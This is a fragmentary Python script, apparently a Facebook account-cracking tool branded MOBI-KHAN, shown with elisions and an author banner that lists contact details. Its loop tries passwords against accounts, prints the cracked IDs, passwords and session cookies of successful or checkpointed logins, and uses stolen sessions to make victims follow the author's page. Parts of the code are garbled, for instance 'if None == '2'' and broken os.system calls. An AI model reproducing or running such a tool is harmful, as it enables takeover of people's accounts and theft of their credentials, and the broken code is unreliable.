...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtu.be/_texNXK7_qs')
        FD()
        return None
...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/M0BIKHAN.0FFICAL')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/M0BIKHAN.0FFICAL', {
...
\033[1;37m================= \33[32;45mADNANO\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33MOBI\33[0;m\033[1;32m && \033[1;33mKHAN\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MUBEEN ARSHID
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMOBI-KHAN
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mWHATSAPP         :  \033[1;35m03109264715
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mMR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO MOBI-KHAN TOOLS\33[0;m
 
\033[1;37m================== \33[32;45mMOBI\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(MOBI-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MOBI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[MOBI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
